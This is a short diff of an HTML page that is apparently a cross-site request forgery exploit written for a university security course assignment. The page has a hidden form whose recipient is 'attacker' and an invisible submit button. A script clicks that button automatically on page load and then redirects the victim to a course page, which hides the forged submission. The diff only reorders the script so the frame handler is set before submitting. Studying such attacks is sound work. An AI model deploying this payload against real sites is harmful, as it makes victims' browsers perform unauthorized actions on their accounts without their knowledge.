@@ -8,18 +8,18 @@
 		<input name="recipient" type="hidden" value="attacker">
 		<input id="send" type="submit" name="submission" value="Send" style="visibility: hidden">
 	</form>
-	<script>
-		var frame = document.getElementById('frame');			
+	<script>		
 		window.onload = function() {
-			document.getElementById('send').click();
-		}
+			var frame = document.getElementById('frame');
+			counter = 0;
+			frame.onload = function() {
+				counter++;
+				if(counter >= 2) {
+					document.location='http://pages.cs.wisc.edu/~rist/642-spring-2014/';
+				}
+			};
 
-		counter = 0;
-		frame.onload = function() {
-			counter++;
-			if(counter >= 2) {
-				document.location='http://pages.cs.wisc.edu/~rist/642-spring-2014/';
-			}
+			document.getElementById('send').click();
 		};
 	</script>
 </body>
